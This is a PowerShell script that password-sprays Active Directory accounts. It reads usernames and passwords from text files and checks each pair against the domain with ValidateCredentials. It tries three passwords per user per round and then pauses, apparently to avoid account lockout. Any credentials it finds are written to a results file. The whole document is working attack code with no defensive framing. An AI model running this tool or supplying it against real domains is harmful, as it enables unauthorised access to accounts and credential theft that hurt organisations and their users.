$UserDomain = $env:USERDOMAIN
Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
$ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
$PrincipalContext = [System.DirectoryServices.AccountManagement.PrincipalContext]::new($ContextType, $UserDomain)

$UserFile = "users.txt"
$PassFile = "passwords.txt"
$LogFile = "results.txt"
$UserCounter = 0
$PassWordCount = (Get-Content $PassFile).Count
$UserTable = @{}

foreach($User in Get-Content $UserFile) {
    $UserCounter++
    $UserTable.$User = @()
    $UserTable.$User += 0
    $UserTable.$User += ""
}

Write-Host "----------------------------------------------------------------------------"

$LastPassValue = $UserTable.Values | Select -Last 1

Write-Host "[!] Starting brute force..."
Write-Host "----------------------------------------------------------------------------"
Start-Sleep -Seconds 5
While($LastPassValue -lt $PassWordCount){
    :UserLoop foreach ($User in $UserTable.GetEnumerator() | sort -Property name ) {
        if($UserTable[$User.Name][1] -ne 1){
            $CurrentPassCount = $User.Value[0]
            $CurrentUser = $User.Name

            1..3 | % {
                $CurrentPassword = Get-Content $PassFile | Select -Index $CurrentPasscount
                Write-Host "[*] Checking $CurrentUser with password: $CurrentPassword"
                $CurrentPassCount = $CurrentPassCount + 1

                $success = $principalContext.ValidateCredentials($CurrentUser, $CurrentPassword)
                if ($success -eq $True)
                {
                    $UserInfo = "$CurrentUser : $CurrentPassword"
                    Write-Output "[!] Password found: $UserInfo"
                    "$UserInfo `n" | Add-Content $LogFile
                    $UserTable[$User.Name][1] = 1
                }
            }
            $UserTable[$User.Name][0] = $CurrentPassCount
    }}
    Write-Host "[!] First section of 3 passwords done..."
    Start-Sleep -Seconds 10
}
